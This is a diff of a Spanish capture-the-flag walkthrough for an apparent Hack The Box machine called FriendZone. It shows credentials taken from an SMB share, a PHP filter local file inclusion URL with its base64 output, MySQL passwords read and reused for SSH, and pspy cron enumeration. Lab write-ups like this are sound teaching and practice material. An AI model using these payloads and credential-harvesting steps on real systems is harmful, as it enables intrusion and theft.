@@ -114,6 +114,12 @@ smb: \> get creds.txt
 getting file \creds.txt of size 57 as creds.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
 ``` 
 Encontramos un archivo `.txt` con credenciales que no sabemos para que sirven.
+```bash
+# cat creds.txt        
+creds for the admin THING:
+
+admin:WORKWORKHhallxxxxxxxx
+```
 
 #Ataque de Transferencia de Zona
 Cuando tenemos el servicio `53 domain` abierto y un dominio potencial como el que habiamos visto antes `friendzone.red` procedemos con la herramienta `dig`
@@ -170,7 +176,7 @@ Final Access timestamp is 1628457816
 ```
 LFI con Wrapper
 PHP de BASE 64
-
+```bash
 https://administrator1.friendzone.red//dashboard.php?image_id=&pagename=php://filter/convert.base64-encode/resource=dashboard
 
 PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=
@@ -226,3 +232,44 @@ https://administrator1.friendzone.red/dashboard.php?image_id=&pagename=/etc/Deve
 Recibimos la conexion como `www-data` correctamente
 
 # Escalando Privilegios 
+Procedemos con el usuario `www-data` a enumerar el sistema. 
+Nos movemos a nivel de directorios para la ruta `/var/www/`
+Encontramos este archivo de configuracion con las credenciales de el servicio MySQL.
+
+creds en mysql archivo .conf
+```bash
+www-data@FriendZone:/var/www$ cat mysql_data.conf 
+for development process this is the mysql creds for user friend
+
+db_user= friend
+db_pass= Agpyu12!0.213$
+db_name= FZ
+```
+Comprobamos si son Validas para SSH
+Conseguimos acceso como el usuario `friend`. Procedemos con la enumeracion a nivel de sistema para el usuario `friend`.
+
+encontramos en la ruta /opt/
+```bash
+friend@FriendZone:/opt$ ls -lR
+.:
+total 4
+drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
+
+./server_admin:
+total 4
+-rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
+```
+Procedemos a enumerar con el script `pspy32s`  para localizar si se esta ejecutando alguna tarea CRON
+```bash
+2021/08/10 15:49:03 CMD: UID=1000 PID=1170   | ./pspy32s 
+2021/08/10 15:49:03 CMD: UID=0    PID=115    | 
+2021/08/10 15:49:03 CMD: UID=0    PID=1146   | 
+2021/08/10 15:49:03 CMD: UID=0    PID=11     | 
+2021/08/10 15:49:03 CMD: UID=0    PID=1065   | 
+2021/08/10 15:49:03 CMD: UID=0    PID=10     | 
+2021/08/10 15:49:03 CMD: UID=0    PID=1      | /sbin/init splash 
+2021/08/10 15:50:01 CMD: UID=0    PID=1181   | /usr/bin/python /opt/server_admin/reporter.py 
+2021/08/10 15:50:01 CMD: UID=0    PID=1180   | /bin/sh -c /opt/server_admin/reporter.py 
+2021/08/10 15:50:01 CMD: UID=0    PID=1179   | /usr/sbin/CRON -f
+```
+Vemos que es lo que hace el script `reporter.py`
